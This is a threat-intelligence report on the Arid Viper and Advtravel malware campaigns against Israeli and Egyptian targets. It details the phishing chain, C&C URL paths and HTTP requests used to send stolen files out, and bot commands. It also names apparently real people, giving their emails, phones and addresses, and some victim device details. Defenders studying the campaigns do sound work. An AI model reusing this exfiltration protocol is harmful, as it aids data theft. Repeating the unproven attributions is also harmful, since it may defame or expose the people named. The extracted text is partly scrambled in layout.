Based on IP addresses associated with malware infections\ntied to the campaign’s core infrastructure, we were able to determine its\ntargets—a government office, transport service/infrastructure providers,\na military organization, and an academic institution in Israel. It also\ntargeted an academic institution in Kuwait along with several other\nunidentified Israeli individuals.\n\nResearch also revealed an interesting Twitter conversation between\n_@Ramzi_MHADHBI, a Tunisian blogger, and @waleedassar, a reverse_\nengineer currently working as a senior security researcher at the Al\nJazeera Media Network. Their exchange mentioned two of the domains\nassociated with Operation Arid Viper malware, suggesting that one or\nboth of them may have also been targeted.\n\n#### Infection Chain\n\nAs will be made clear later, Operation Arid Viper aimed to extract victim\ninformation though it also paid much attention to its means of getting\ninto target systems. The campaign used the most popular targeted\nattack infection vector—a simple phishing email from a nonexistent\nsender to a specific recipient. It targeted organizations from various\nindustries with a clear focus on Israel.\n\nThe spear-phishing email came with a compressed file attachment\nand a more or less credible social engineering ploy to trick victims into\nopening it and running the embedded .EXE file. The .RAR file\nattachment contains an .SCR file that when executed drops two more\nfiles onto an infected system. One file is a short pornographic video in\n.FLV or .MPG format, depending on the samples seen. The other file is\na Windows® binary file sporting the icon of the well-known Internet\ncommunication program, Skype™.\n\n\n_Operation Arid Viper targeted_\n_various Israeli organizations_\n_across industries._\n\n\n_Twitter conversation between_\n@Ramzi_MHADHBI and\n@waleedassar\n\n\nOperation Arid Viper was unusual in that it had a pornographic component in hopes\nof taking user focus away from the infection or the fact that something strange is\nhappening. It targeted professionals who might be receiving very inappropriate\ncontent at work and so would hesitate to report the incident. These victims’ failure to\nact on the threat could have then allowed the main malware to remain undiscovered.\nThe attackers used a distinct and likely successful strategy previously unseen when it\ncame to avoiding incident response team investigations.\n\n\n-----\n\nIt is also worth mentioning that variations in the spear-phishing\nelements were seen across attacks though the idea behind them was\nthe same. They all used a socially engineered email with a malicious file\nattachment and had a pornographic element as shown in the infection\nchain.\n\nOnce executed, the binary accesses a command-and-control (C&C)\nserver to immediately download an updated module and check if the\ninfected system is already known or if it has been newly infected.\nEach infected system is assigned a unique identifier comprising\nits hard disk name and a specific set of numbers. Specific URLs\nare used for command and control. Note how often the unique\nidentifier is used in all kinds of communication with C&C servers.\nBelow are sample commands for a system with the unique ID,\n_VMwareVirtualIDEHardDrive—1268730784._\n\n**_•_** **_/session/aadd_rtemp._**\n**_php?n=VMwareVirtualIDEHardDrive—1268730784: To add_**\nthe system’s record or perhaps start a communication session.\n\n**_•_** **_/session/gget_rtemp._**\n**_php?n=VMwareVirtualIDEHardDrive—1268730784: To get a_**\nrecord or perhaps continue a communication session.\n\n**_•_** **_/flupdate/3.html: To download an updated .EXE file._**\n\nIncidentally, even though the file that\nshould be downloaded—3.html—\nwas hard-coded into the original\nmalicious binary, the C&C server\nhas sequentially numbered similar\nthough not identical binaries such\nas 1.html, 2.html, and so on. These\nvaried from sample to sample but\nwere all Base64-encoded strings.\n\nThe malware also commonly set\nthe User-Agent for communication\nto “SK,” “Skypee,” or “Skype” as\nshown in the Wireshark log.\n\n\n_Operation Arid Viper infection_\n_chain_\n\n\nThe previously mentioned paths—\naadd_temp and gget_rtemp—varied\na little from sample to sample and\nC&C server to C&C server but the\nrequest formatting was the same. A\nnonexhaustive list of other paths\nseen include:\n\n\nUser-Agent Wireshark log for “SK,” “Skypee,” or “Skype”\n_communication_\n\n\n-----\n\n_•_ _/new/add_tree.php?name=[SYSTEM-_\n_ID]&date=[TODAYS DATE]_\n\n_•_ _/new/all_file_info1.php?name=[SYSTEM-_\n_ID]&user=[NUM]&file=[DD-MM-YYYY HH-MM._\n_uml]&type=msn_\n\n_•_ _/new/all_file_info1.php?name=[SYSTEM-_\n_ID]&user=[NUM]&file=[DD-MM-YYYY HH-MM._\n_rml]&type=log_\n\n_•_ _/new/all_file_info1.php?name=[SYSTEM-_\n_ID]&user=[NUM]&file=[DD-MM-YYYY HH-MM._\n_dll]&type=img_\n\n_•_ _/new/all_file_info1.php?name=[SYSTEM-_\n_ID]&user=[NUM]&file=[DD-MM-YYYY HH-MM._\n_rml]&type=tree_\n\n_•_ _/new/get_flash.php?name=[SYSTEM-_\n_ID]&serial=[SERIAL NUM]_\n\n_•_ _/new/get_tree.php?name=[SYSTEM-_\n_ID]&date=[DD-MM-YYYY]_\n\n_•_ _/new/get_statu.php?name=[SYSTEM-ID]_\n\n_•_ _/new/view_flash_files.php?name=[SYSTEM-_\n_ID]&serial=[SERIAL NUM]_\n\n\n\n_•_ _/new/view_flash_random._\n_php?name=[SYSTEM-ID]&serial=[SERIAL_\n_NUM]_\n\n_•_ _/new/update.php_\n\n_•_ _/new/view_file_order.php?name=[SYSTEM-ID]_\n\n_•_ _/new/view_file_up.php?name=[SYSTEM-ID]_\n\n_•_ _/new/view_random_order._\n_php?name=[SYSTEM-ID]_\n\n_•_ _/down/add_temp.php?name= [SYSTEM-ID]_\n\n_•_ _/new/add_tuser.php?name=[SYSTEM-ID]&use_\n\n_•_ _/new/chang_flag.php_\n\n_•_ _/new/chang_rfflag.php_\n\n_•_ _/new/chang_rflag.php_\n\n_•_ _/new/n_chang_fflag.php_\n\n_•_ _/mians/aadd_rtemp.php?n=[SYSTEM-ID]_\n\n_•_ _/mians/gget_rtemp.php?n=[SYSTEM-ID]_\n\n_•_ _/session/aadd_rtemp.php?n=[SYSTEM-ID]_\n\n_•_ _/session/gget_rtemp.php?n=[SYSTEM-ID]_\n\n\nWhen the second-stage malware runs, it sets itself to autorun with each system reboot in the guise of an Internet\ncommunication software. This is accomplished with an oldfashioned auto-start registry key such as HKCU\\SOFTWARE\\\n_Microsoft\\Windows\\CurrentVersion\\Run—“Skype = <path\\_\n_name.exe”>. This keeps the path and name of the .EXE_\nfile dropped into the registry key. It also copies itself into\n_%SystemDrive%\\Program Files\\Messenger via a hard-coded_\npath. In addition to using “Skype” in the registry, the malware\nalso frequently spoofed the Skype icon. All of the malware\nsamples seen had portable executable (PE) file sections\nwritten in Arabic.\n\nThe malware logs in to the C&C console by calling a very\nspecific PHP script on the C&C server—/products/add_user.ph\n_p?name=VMwareVirtualIDEHardDrive—1268730784&user=38._\nThe number it creates for the user parameter—38 in the\nexample—was chosen from the malware client to identify\nthe session. It then starts searching the whole hard disk for\ndocuments—.DOC, .XLS, .PPT, and .TXT files. Each document\nfound is reported to the C&C server using the format, GET /\n_products/file_order3.php?name=VMwareVirtualIDEHardDri_\n_ve—1268730784&path=C:/Documents%20and%20Settings/_\n\n\n_The Wireshark log (top) shows the files_\n_the malware sends to a C&C server._\n_The assembly code section (bottom)_\n_searches for .XLS files to steal._\n\n\n-----\n\nThe C&C server immediately responds if each document is interesting or not. This\ndecision probably comes from a hard-coded black list on the server side to likely\nprevent the client from sending out default templates and generic readme.txt files.\nThe server also tries to avoid requesting for duplicates of files it already has in further\nstealing sessions. It has two possible responses:\n\n   - Response for an interesting document:\n```\n    HTTP/1.1 200 OK\n    Date: Thu, 02 Oct 2014 14:49:45 GMT\n\n```\nServer: Apache/2.4.10 (Unix) OpenSSL/1.0.1e-fips mod_\nbwlimited/1.4\nX-Powered-By: PHP/5.5.16\nTransfer-Encoding: chunked\nContent-Type: text/html\n```\n    4\n\n```\n6\ndone\n```\n    0\n\n```\n   - Response for an uninteresting document:\n```\n    HTTP/1.1 200 OK\n    Date: Thu, 02 Oct 2014 14:49:23 GMT\n\n```\nServer: Apache/2.4.10 (Unix) OpenSSL/1.0.1e-fips mod_\nbwlimited/1.4\nX-Powered-By: PHP/5.5.16\nTransfer-Encoding: chunked\nContent-Type: text/html\n```\n    2\n    2\n\n```\nThe client then proceeds to list down all of the interesting documents to steal. These\nare compressed in a 0.txt file and uploaded to a C&C server via a POST request such\nas POST /products/fupdates.php. This request comprises a single POST parameter\nformatted as a GET parameter such as account=38&name=VMwareVirtualIDEHardD\n_rive—1268730784&folder=tree&fname=02-10-2014 10-50.rml&s=<base64-file>._\n\nThe server presumably uses the account value, which is the same as the previously\nmentioned user value, to track sessions where particular files are uploaded. The\n_fname parameter is the .ZIP file’s name and contains a specific date and time. The_\n_0.txt file is deleted after the upload._\n\nAt the end of the file upload, the client issues the request, /products/all_file_info1.ph\n_p?name=VMwareVirtualIDEHardDrive—1268730784&user=38&file=02-10-2014%20_\n_10-50.rml&type=tree, to make sure everything went smoothly._\n\nAs shown, a single execution allows the malware client to steal documents from\ninfected systems. After carrying out all of its routines, the malware routinely checks\nback with the C&C server to see if it should continue running using the path,\n_/products/get_statu.php?name=VMwareVirtualIDEHardDrive—1268730784. A_\nresponse containing run11 tells it to continue running whereas stop disables it to\npossibly avoid infecting uninteresting systems.\n\n\n-----\n\n#### C&C Infrastructure\n\nUsing an initial malware sample and its corresponding C&C server,\nwe looked through internal Trend Micro databases to compile a list of\nsimilar malware that contact the same server. All cases revealed that the\nmalware essentially exhibited the same behaviors previously outlined.\n\nThe first C&C server found was pstcmedia.com. A quick search\nrevealed that another site—mixedwork.com—hosted on the same IP\naddress—188.40.81.136—also acted as a C&C server. Although the\n_pstcmedia.com site changed IP addresses, mixedwork.com seemed to_\nstay on this IP address. The other IP addresses pstcmedia.com used\ninclude 192.254.132.26 and 54.255.143.112. The second IP address has\nbeen sink-holed by other security researchers.\n\nTo find other domains that may be part of the same campaign or used by\nthe same perpetrators, an investigation of domain registration data was\nconducted. The C&C server that pstcmedia.com used was registered\nusing the personal email address, khalid.samraa@gmail.com. More\ndetails on this can be found in the attribution section.\n\nThe main page of mixedwork.com also contained a decoy redirection to\nthe legitimate site, http://channel9.msdn.com/events/mix. But on its 404\npage, it is interesting to note the mention of the email address, ahmed.\n_jmal1989@gmail.com, as site administrator._\n\nAn in-depth look at Trend Micro™ Smart Protection Network™ feedback\nfor network activity similar to the previously mentioned URL paths\nallowed us to identify where the following active C&C servers were at\nvarious times:\n\n_•_ _ahmedfaiez.info_\n\n_•_ _flushupdate.com_\n\n_•_ _flushupate.com_\n\n_•_ _ineltdriver.info_\n\n_•_ _mediahitech.com_\n\nThe first three servers have all been hosted at some point on the same\nIP addresses—188.40.75.132 and 188.40.106.84—located in Hetzner,\nGermany. A more in-depth look at the first IP address revealed that\namong several other domains, it also hosts two—advtravel.info and\n_fpupdate.info—that have clear ties to cybercriminal activities although not_\nnecessarily to the same campaign being investigated.\n\nA closer look at the last two C&C servers revealed that they have been\nmisconfigured and allowed directory listing. Inside them were large\namounts of victim data analyzed in the Operation Advtravel section.\n\n\n-----\n\n_Maltego® map showing the relationships among the sites, IP addresses, and servers seen in the featured_\n_campaigns_\n\n\nOperation Arid Viper’s main C&C servers have been configured so their main pages\nredirected visitors to other web pages as shown in the table below.\n\n|C&C Server|Site It Redirects To|\n|---|---|\n|ahmedfaiez.info|Simply shows the word “test”|\n|flushupate.com|helpx.adobe.com/flash-player.html|\n|flushupdate.com|get.adobe.com/flashplayer|\n|ineltdriver.com|downloadcenter.intel.com/default.aspx|\n|mediahitech.info|Not resolving anymore|\n|mixedwork.com|visitmix.com/work|\n\n\n-----\n\n|C&C Server|Site It Redirects To|\n|---|---|\n|plmedgroup.com|palmgroupasia.com|\n|pstcmedia.com|A parked page|\n\n\nA check of the Domain Name System (DNS) Start of Authority (SOA) and Whois\nrecords of each identified C&C server turned up several other interesting email\naddresses, more details on all of which can be found in the attribution section.

But it does bear\ncertain similarities to Operation Arid Viper that we believe merits its addition to this\npaper. The cybercriminals behind this campaign may have some ties with the threat\nactors behind Operation Arid Viper, which include:\n\n   - They shared servers for command and control.\n\n   - They used the same email addresses to register their domains—advtravel.\n_info, fpupdate.info, and linksis.info._\n\n   - Their perpetrators had ties to the Gaza Strip.\n\n#### C&C Infrastructure\n\n\nWhile conducting our investigation, we came across an Advtravel C&C\nserver that shared the same infrastructure with Operation Arid Viper.\nIt is particularly interesting to note that the advtravel.info site left its\nserver’s root directory structure completely open to the public. This,\ncombined with some other cybercriminal activities elaborated in the\nattribution section, led us to believe that the Advtravel attackers were\nless-skilled than those behind Operation Arid Viper.\n\nAn analysis of December 2014 data shows that Advtravel’s C&C server\ndirectory could be publicly accessed. This allowed us to download copies\nof its entire content to study as part of our investigation before its owners\nrealized their mistake and locked it down. Earlier versions of data from\nSeptember 2014 were also downloaded.\n\n\n_Publicly accessible Advtravel_\n_site root directory_\n\n\nThe advtravel.info directory had several files and folders. Although we were not able\nto exhaustively analyze every file on it, details on its most interesting components are\nhighlighted below:\n\n**_•_** **_B1312.zip: This is a 1.4GB compressed backup of all of the other files on the_**\nC&C server. Leaving this file on the server allowed us to look inside the code\nof the .PHP files the attackers used.\n\n**_•_** **_/apps/: This main directory contains stolen victim data, along with several_**\nPHP scripts that uploaded it to the server. It used the format, /apps/A[3\n_nums]X/[COMPUTERNAME_USERNAME] where A[3 nums]X represents a_\nparticular subcampaign while /[COMPUTERNAME_USERNAME] identifies a\nunique victim. The three digits in the folder format seem to indicate the month\nof the year, as they ranged from 001 to 012. Further analysis of the dates\nwhen the data was stolen, however, disproved that theory.\n\nAn exhaustive analysis of every file on the server is beyond the scope of this\npaper but the details of the most interesting components are:\n\n\n-----\n\n� **_/apps/A[3 nums]X/ison.on: This refers to_**\nthe last time stolen data was uploaded in\nthe format, dd-mm-yyyy-hh-mm-ss.\n\n� **_/apps/A[3 nums]X/data/: This contains_**\nscreenshots taken from infected systems,\nalong with the following files, the presence\nof which varied from victim to victim:\n\n� **_allips.txt: Contains victims’ local and_**\nexternal IP addresses.\n\n� **_CurrentProcess.txt: List of running_**\nprocesses on infected systems.\n\n� **_cmpinf.txt: Contains the infection_**\ndate, OS, user domain name, and\nusername.\n\n� _downinf.txt: Contains the infection date,_\nOS, user domain name, username,\nand status such as “Download\nComplete :).”\n\n� **_DrivesList.txt: List of all of an infected_**\nsystem’s drives.\n\nshown in the table below.\n\n\n� **_FileList.txt: List of files in a directory_**\non an infected system, frequently\nwhere the malware was executed.\n\n� **_pdata.txt: List of stolen website login_**\ncredentials.\n\n� **_webrowser.txt: List of stolen web_**\nbrowser credentials.\n\n� **_wifi.txt: List of stolen Wi-Fi connection_**\ncredentials.\n\n� **_workdata.txt: Contains the infection_**\ndate, OS, user domain name,\nusername, and a line labeled APP_\n_PATH=, which indicates which directory_\nthe malware was installed on.\n\n� **_Winkey.log: Log of victims’ keystrokes._**\n\n� Other files that the attacker manually\nordered his malware to directly\nsteal from the victim.

From\n2007 to 2012 though, it was registered to:\n\nRegistrant Name:Adv Travels\nRegistrant Organization:Adv Travels\nRegistrant Street1:4401 Bayou Boulevard\nRegistrant Street2:\nRegistrant Street3:\nRegistrant City:Pensacola\nRegistrant State/Province:Florida\nRegistrant Postal Code:32503\nRegistrant Country:US\nRegistrant Phone:+01804777777\nRegistrant Phone Ext.:\nRegistrant FAX:\nRegistrant FAX Ext.:\nRegistrant Email:renold.dave@advtravel.info\n\n#### Malware\n\nAn analysis of the stolen files and logs allowed us to come up with a brief description\nof the initial Advtravel malware. In general, it only serves to respond to a C&C server.\nThe attackers then manually downloaded other tools onto infected systems to extract\nvictim credentials.\n\n|File Name|MD5 Hash|Purpose|\n|---|---|---|\n|pat.exe|2e5da32b07c531a6508b77f624bbeb22|Same file as start.exe|\n|app11.exe|342f79337765760ad4e392eb67d5ed2c|MSI installer for dotnet2|\n\n|File Name|MD5 Hash|Purpose|\n|---|---|---|\n|dotnet2.exe|c64fd1f972822ed84378c7058fea0744|Legitimate .NET installer|\n|wininstl.exe|342f79337765760ad4e392eb67d5ed2c|Same file as app11.exe|\n\n\n-----\n\nAfter the initial dropper or download chain, the malware starts its\ndata-stealing routine. It calls home to a C&C server and report each\nfolder found on the infected system. The server then replies with a\nconfirmation on whether or not the malware should send the folders’\ncontents.\n\nThe Advtravel and Operation Arid Viper malware had similar behaviors.\nThis may or may not be a coincidence, as their binaries significantly\ndiffered. The Advtravel malware was coded in C# so the dropper needs\nto go through additional steps to build and update a .NET-running\nenvironment where it can be executed. This involves downloads and\nMicrosoft™ software installations, which not only caused significant\ninfection delays but also served as an additional point of failure to\nexecute.\n\nThe following are some sample HTTP requests seen in Operation\nAdvtravel:\n\n**_•_** **_GET/sys/who.php?t=2/8/2015%205:30:59%20AM HTTP/1.1:_**\nFirst-time login.\n\n**_•_** **_GET/sys/genid.php?t=2/8/2015%205:31:00%20AM: Asks to_**\ngenerate a unique ID for a particular first-time client. The ID\nreturned in this example was 2aMUu7TcPbUBsHVLNogB.vic,\nwhich will be used by the bot client throughout.\n\n\n_Possible Advtravel malware_\n_infection chain_\n\n\n\n**_•_** **_POST/sys/upload.php?dirname=//2aMUu7TcPbUBsHVLNogB.vic&x=old:_**\nSend directory name information.\n\n**_•_** **_GET/sys/data//2aMUu7TcPbUBsHVLNogB.vic/command._**\n**_cmd?t=2/8/2015%205:31:02%20AM: Get a command from the server._**\n\nIn one particular example, the initial malware was a self-extracting .CAB file that\neventually downloaded the main malware and patver.tmp, which contains the value,\n_A012X. This value indicates the server folder where the stolen data should be_\nuploaded to. This is essentially a campaign identifier. The malware then dropped\na .JPG file showing the famous Dome of the Rock Church in Jerusalem. It also\nexhibited the following behaviors:\n\n   - Installs itself to a default location such as C:\\Users\\[USER]\\AppData\\Roaming\\\n_AdobeAPP or C:\\Documents and Settings\\[USER]\\Application Data\\explr_\n\n   - Puts logs and support files in C:\\Users\\[USER]\\AppData\\Roaming\\AdobeAPP\\\n_temp (Note that the .EXE file varies and appears to be downloaded on_\ndemand.)\n\n   - Uses many of the support files previously described in another section, which\nare found in the \\temp folder\n\n   - Can send commands such as the following to bots:\n\n� **_get_scrshot: Get a screenshot._**\n\n� **_get_workdata: Returns an infected system’s local time, OS, user domain_**\n\n\n-----\n\nname, username, and malware path.\n\n� **_explore_dir*[FULL PATH TO DIR]:_**\nGets a directory listing.\n\n� **_run_file*[FILE TO RUN]: Executes a_**\nfile.\n\n� **_get_file*[FILE TO GET]: Retrieves a_**\nvictim’s file.\n\n� **_get_procslist: Gets a process or task_**\nlist.\n\n� **_kill_prcs*[PID]: Kills a process._**\n\n� **_get_driveslist: Lists all of an infected_**\nsystem’s mounted drives.\n\n� **_=FILE=: Allows attackers to upload_**\nnew files to a victim’s system.\n\n� **_download*[URL]: Downloads a file_**\nfrom a URL onto an infected system.\n\n� **_del_path*[FILE]: Deletes a file or_**\nfolder.\n\n   - Communicates with the advtravel.info/\n_apps/ directory to listen for commands_\nand uploads stolen data to the /\n_del directory. The log lists down an_\ninfected system’s current directory, runs\na password stealer, retrieves stolen\ncredentials, and takes screenshots.\n\nBased on patlogs, at least four botnet\nadministrators—khloda@dhs, belal@dhs,\n_belal2@dhs, and admin@dhs—log in to the_\nserver and control the bots through the\nadministration panel—a tool called DHDSM.\n\n#### Victims\n\n\n_Log of the activities an Advtravel malware variant_\n_performs on infected systems_\n\n\nThe Advtravel server has more than 500 infected systems. All of the stolen details\nfound on it have been backed up for evidence. Most of the data have been analyzed\nto get an idea as to who have been victimized by the campaign. Some observations\nmade include:\n\n   - The majority of victims appeared to be Arabs from Egypt.\n\n   - All of the infected systems appeared to be personal laptops, judging by the\npresence of a battery indicator in screenshots. This led us to believe that the\ncampaign was not as sophisticated or as targeted as Operation Arid Viper.\n\n\n-----\n\n   - The attackers appear to be keenly interested in images stored on victims’\nsystems. This could be a sign that they are looking for incriminating or\ncompromising images for blackmail purposes. As such, the attackers may be\nless-skilled hackers who are not after financial gain nor hacking for espionage\npurposes.\n\n   - A lot of the screenshots unusually showed open Facebook profiles. The\nvictims either spent a lot of time on Facebook every day or the malware took\nscreenshots every time a victim accessed the site. This allowed the attackers\nto identify their victims. More details on this will be revealed after further\ninvestigation.\n\n#### fpupdate.info Server\n\nThe fpupdate.info server’s main directory contains a /mobile/ folder.\nAt the time of writing, the site no longer allowed public access to\nthe server’s files although we were able to back them up back in\nSeptember 2014.\n\n\nAt present, all of the related .PHP files cannot access the server’s\nback-end database, which could mean it is down or unmaintained. An\nuploads folder had two subfolders that contained personal information\nstolen from victims’ mobile phones. Each subfolder had another two\nsubfolders—/calllog and /sms. We were, however, unable to obtain a\ncopy of the Android™ malware the attackers may have used to create\nthe logs.\n\n##### VICTIMS\n\nThe fpupdate.info server contained phone data stolen from two victims,\nnamely:\n\n\nfpupdate.info main directory\n\n\n_Victim data stored on_\nfpupdate.info\n\n\n\n**•** **LGE_IMEI: The device’s International Mobile Station Equipment Identity**\n(IMEI) number revealed that it was an LG D821 Nexus 5 phone owned\nby someone from Israel. Call logs containing several Israel-based phone\nnumbers, some of which had corresponding contact names, were found on\nthe server. One particular contact called My Number belonged to someone\nfrom Palestine.\n\n**•** **SAMSUNG_IMEI: This device’s IMEI number revealed that it was a Samsung**\nP5100 Galaxy Tab 2 10.1 owned by someone from Israel. Logs indicating\ncalls made to several Israel-based phone numbers were found, along with\nSMS logs. Most of the text messages were tweets by @shadipal2 and\n_@Alaqsavoice_Brk, users who relayed real-time news about Gaza. The other_\ntext messages, meanwhile, revealed meetings in places in Tunisia such as\nGafsa and Sakiet Eddaier.\n\n\n-----\n\n##### LINKSIS.INFO SERVER\n\nIn addition to the two previously mentioned servers, linksis.info has also been found\nto have a very similar open directory layout to advtravel.info. It also used a lot of the\nsame malware. We have not completely explored this server though a quick look\nclearly revealed ties to advtravel.info, including:\n\n   - It is hosted on the same IP address—188.40.106.84—located in Hetzner,\nGermany.\n\n   - Its DNS SOA record used the email address, mahmoud.hashem12@gmail.\n_com._\n\n   - It has an http://www.linksis.info/sys/del/belal/ folder, which is owned by one of\nthe users of advtravel.info’s C&C control panels.\n\n   - It contains the same log files—webbrowser.txt and so on—although these\nwere encrypted.\n\n### ATTRIBUTION\n\nThe individuals identified in this section have some apparent connection with\nOperation Arid Viper or Advtravel. Trend Micro would, however, like to point out\nthat they may or may not be involved with cybercrime. We simply intend to lay out\nverified facts that link them to the campaigns’ infrastructure and malware. Several\nother reasons such as having their email accounts stolen and used to register C&C\nservers, deliberate impersonation, and the like could also account for their links to the\ncampaigns.\n\n#### Khalid Samra\n\nSome of the C&C server domain\nnames were registered by a\nsupposed Khalid Samra from\nPalestine. His social networking\naccount email addresses were used\nto register several Operation Arid\nViper C&C servers based on Whois\nregistration data.\n\n\nAn email address incorporating\nSamra’s name—khalid.samraa@\n_gmail.com—was used to register the_\n_pstcmedia.com C&C server based_\non DNS SOA records. Further\nOSINT investigation revealed ties to\nother similar email addresses—khalid.\n\n\n_Khalid Samra’s profile also mentions that he was based in_\n_Palestine._\n\n\n-----\n\n_Samra’s two Facebook accounts with matching profiles and images_\n\n\n_Two Facebook pages Samra has ties to_\n\n\n_samraa@gmail.com, khalid.samraa@hotmail.com, khalid.samraa@wwb.ps, and_\n_khalid.samraa@coreions.com._\n\nTo get a better idea as to what sort of person Samra is and to determine if he may\nhave a motive for taking part in the campaigns, we took a look at his other social\nnetworking accounts. He apparently has two Facebook accounts—https://www.\n_facebook.com/khaled.a.samraa and https://www.facebook.com/khalid.k.abusamra._\nThe email address for the first account was used to register one of Operation Arid\nViper’s C&C servers. The publicly visible profile pictures also suggest that he owned\nall three accounts. The accounts indicate that he lives in Gaza and that he has proPalestine and anti-Israeli political beliefs.\n\n\n-----\n\nWhat appears to be Samra’s second Facebook account also indicates\nthat he is from Gaza. It also mentions where he worked, Coreions,\nlike his LinkedIn profile. Unlike the first account though, this has more\nties to several members of his family. Photographs posted on it also\nclearly show his presence in Gaza in 2012. A further Facebook search\nfor the email address, khalid.samraa@gmail.com, also pointed to a\ngroup page called “GazaUnderFire2012” (https://www.facebook.com/\n_GazaUnderFire2014), which Samra apparently set up back in 2012. This_\npage then led to a newer group page called “Gaza Under Attack 2014”\n_(https://www.facebook.com/gazaunderattack2014). Both of the pages_\nprovide updates on the ongoing Palestine-Israel conflict with a very\nstrong pro-Palestine/-Hamas and anti-Israeli focus, just like the personal\nSamra Facebook accounts.\n\nApart from the Facebook accounts, Samra had other social networking\naccounts such as in Twitter (https://twitter.com/KhalidSamraa), Google+\n_(https://plus.google.com/113430785728528060894/ and https://plus._\n_google.com/117379342774799926526/), and MySpace (http://myspace._\n_com/225923317)._\n\nOn 4 November 2011, Coreions’ Whois record again changed. Although\nall of the major details remained the same, the email address was\nchanged to khalid.samraa@gmail.com. On 13 January 2012, its entire\nregistration details changed to the following:\n\nkhalid abu samra ()\nGaza- Al Rimal- Al Wihda Street, Opposite to Al-Amal\ninstitu\nAl-Nakheel commercial mall, 1st floor\nGaza, ISRAEL 00972\nIL\n\n#### Ahmed Jmal\n\nThe email address, ahmed.jmal1989@gmail.com, was used to register\ntwo of Operation Arid Viper’s C&C servers—mixedwork.com and\n_plmedgroup.com. It also has ties to the Facebook account, https://www._\n_facebook.com/ahmed.jmal.00. The Ahmed Jmal Facebook account_\nindicates that he resides in Marrakesh, Morocco.\n\n#### Mahmoud Hashem\n\nThe email address, mahmoud.hashem12@gmail.com, was used to\nregister two Operation Arid Viper C&C servers—mediahitech.info and\n_ahmedfaiez.info—and one of the Advtravel C&C domains—fpupdate._\n_info. Ahmedfaiez.com and fpupdate.info also has ties to the email_\naddress, moh.s009@gmail.com. This fact shows a relationship between\n\n\n-----\n\nthe two campaigns even if they\nused unrelated binaries. They did\nhave some commonalities such\nas sharing a common network\ninfrastructure.\n\n_Moh.s009@gmail.com was also_\nused to register six of the C&C\nservers—ahmedfaiez.info, fpupdate.\n_info, ineltdriver.com, flushupdate._\n_com, flushupate.com, and advtravel._\n_info—related to the two campaigns._\nIt was also found in DNS SOA\nrecords for linkedim.in, iwork-sys.\n_com, nauss-lab.com, nice-mobiles._\n_com, and abuhmaid.net._\n\nThe site, linkedim.in, was\nparticularly registered using the\nfollowing details:\n\n\n_Ahmed Jmal’s email address was used to register two of_\n_Operation Arid Viper’s C&C servers._\n\n\nRegistrant Name:Mahmoud Hashem\nRegistrant Organization:blogging\nhoster\nRegistrant Street1:omar mokhtar\nRegistrant City:gaza\nRegistrant State/Province:gaza strip\nRegistrant Postal Code:00972\nRegistrant Country:IL\nRegistrant Phone:+972546587385\nRegistrant Email:blogging.host@live.com\n\nThe registration details above ties the two email addresses—mahmoud.hashem12@\n_gmail.com and moh.s009@gmail.com—together. We believe they belong to the same_\nperson though we have yet to find a real person behind the profiles.\n\n#### Dev_hima\n\nAs previously mentioned, several advtravel.info infection logs can be clearly\nlinked to Operation Advtravel’s malware developers or bot masters. It is also worth\nremembering that the malware used in Operations Advtravel and Operation Arid\nViper distinctly differed from each other though they shared a common network\ninfrastructure. The logs showed that the infection started from the same folder\nVisual Studio® drops a compiled file into and that screenshots showed other\nmalware present on advtravel.info. This shows that advtravel.info is a development\nenvironment and could very likely be where the malware are programmed. The\nserver’s username is Dev_hima. A close look at other log files allowed us to find at\nleast three other systems with the same user. Some of the samples gathered from\nthe Trend Micro sample database listed down Dev_hima as an internal author as\nwell.\n\n\n-----\n\nThe bot logs from Dev_hima look\nlike logs from test environments\nwith different virtual machines that\nbelonged to the original developer\nwho performed some debugging\nand testing. This mistake went\neven further, as while testing the\nmalware, it took several screenshots\nof Dev_hima’s system, which gave\nus some insight into his operations.\nThe CPanel display in a Windows 8\nenvironment showed how he went\nthrough victim logs. Other tabs open\nin the same browser display his\nFacebook profile page.\n\nThe control panel is a Windows tool\ncalled “DHSDM.” Its icon can also\nbe seen as the rightmost program\non the taskbar. This can be found\non several of Dev_hima’s test virtual\nmachines. It also showed that Dev_\nhima corresponded to the Admin\nuser of the control panel. Other\ndetails recovered from logs revealed\nan IP address geolocated in Cairo,\nEgypt.\n\nAnother clue to Dev_hima’s relation\nto the Advtravel malware was a\nworking downloader from December\n2014 that is related to advtravel.\n_info. It downloaded a malware from_\na server that is then run on infected\nsystems. The PE header data of\nthis downloader again showed the\nname, Dev_hima as application\npublisher. Nveron appears to be Dev_\nhima’s filename for the malware.\n\n\n_Screenshot of Dev_hima’s system stored on advtravel.info_\n\n\n_Information on a malware variant published by Dev_hima_\n\n\nA web search for developers with the nickname, Dev_hima, turned up one profile that\nfit what we know so far very well. Dev_hima was not exactly hiding online. He actually\nhad various online accounts—http://devhima.blogspot.com/p/blog-page.html, http://\n_devhima.webs.com/about, youtube.com/user/ibrahhm2121/, facebook.com/devhima,_\n_twitter.com/dev_hima, linkedin.com/pub/ebrahim-elsharawy/69/324/7b5, scribd.com/_\n_devhima, soundcloud.com/ebrahim-elsharawy, and devhima.tumblr.com—that tie his_\nreal identity to his nickname.\n\n\n-----\n\nDev_hima can also be tied to the\nSkype ID, ibrahhm2121, along\nwith the email addresses, dev_\n_hima@yahoo.com, devhima@_\n_hotmail.com, ibrahhm2121@_\n_gmail.com, ibrahhm212@gmail._\n_com, and ibrahhm2121@yahoo._\n_com. Of course, it is conceivable_\nthat a malicious hacker sought to\nappropriate El Sharawy’s identity\nor coincidentally chose the same\nnickname.\n\nA look at malicious activities tied to\nthe nickname, Dev_hima, revealed\nvery interesting things. We found\nthat Dev_hima was part of the\n“Gaza Hacker Team,” a group\ninvolved in multiple website hacking\nand defacement incidents against\nIsraeli targets in the past. A few of\nthe more than 2,000 defacement\nattacks the team carried out\ninvolved sites in Israel.\n\n\n_Some of Dev_hima’s social networking profiles_\n\n\nSome of Dev_hima’s hacker group\nprofiles can also be found on gaza_hacker.org/cc/member-u_42271._\n_html and arabteam2000-forum.com/_\n_index.php/user/272853-dev-hima/._\nHis personal project page—http://\n_devhima.webs.com/—showed_ _Dev_hima also has ties to several email addresses and online_\nseveral potentially malicious tools _accounts_\nthat he has coded. DevPcTwitter, for\ninstance, allows attackers to control a\ntarget system using a Twitter account. DevSpy, meanwhile, allows parents to monitor\ntheir children’s online communication and browsing habits for protection purposes. In\nreality though, DevSpy is simply a piece of spyware.\n\nDevPcTwitter (MD5: bfcb492d282960152a366b5760b87920d02c6e83) is publicly\navailable for download on Dev_hima’s site.\n\nThe structure of the last four DevPcTwitter commands—getfile*[file_path]—is\ninteresting. The commands had a similar though not identical syntax to the 